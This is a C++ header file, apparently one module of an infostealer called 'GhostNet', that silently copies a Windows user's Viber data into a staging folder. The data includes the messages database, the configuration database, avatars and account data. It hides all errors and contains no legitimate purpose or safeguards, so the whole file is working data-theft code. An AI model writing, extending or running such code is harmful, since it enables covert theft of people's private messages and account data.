#pragma once
// viber.h
#ifndef VIBER_HPP
#define VIBER_HPP

#include <string>
#include <filesystem>
#include <cstdlib>
#include <windows.h>
#include <vector>

namespace fs = std::filesystem;

namespace Viber {
    inline void ExtractViberData(const std::string& ghostNetPath) {
        // Get user profile path
        char* userProfile = getenv("USERPROFILE");
        if (!userProfile) return;

        std::string viberDir = std::string(userProfile) + "\\AppData\\Roaming\\ViberPC";

        // Check if Viber is installed
        if (!fs::exists(viberDir)) return;

        // Create Viber folder in GhostNet directory
        std::string targetDir = ghostNetPath + "\\Viber";
        CreateDirectoryA(targetDir.c_str(), NULL);

        // List of important Viber files/folders to prioritize
        std::vector<std::string> importantFiles = {
            "config.db",      // Main configuration database
            "viber.db",       // Messages database
            "\\.storage",     // Storage folder
            "Avatars",        // User avatars
            "Backgrounds",    // Chat backgrounds
            "PublicAccounts"  // Public account data
        };

        try {
            // Copy Viber data
            for (const auto& entry : fs::recursive_directory_iterator(viberDir, fs::directory_options::skip_permission_denied)) {
                std::string relativePath = fs::relative(entry.path(), viberDir).string();
                std::string destPath = targetDir + "\\" + relativePath;

                // Skip temporary and cache files
                if (relativePath.find("Cache") != std::string::npos ||
                    relativePath.find("temp") != std::string::npos ||
                    relativePath.find("Temp") != std::string::npos) {
                    continue;
                }

                if (fs::is_directory(entry)) {
                    CreateDirectoryA(destPath.c_str(), NULL);
                }
                else {
                    // Create parent directories if needed
                    fs::path destDir = fs::path(destPath).parent_path();
                    fs::create_directories(destDir);

                    // Copy file
                    CopyFileA(entry.path().string().c_str(), destPath.c_str(), FALSE);
                }
            }
        }
        catch (const std::exception& e) {
            // Silently handle errors
        }
    }
}

#endif // VIBER_HPP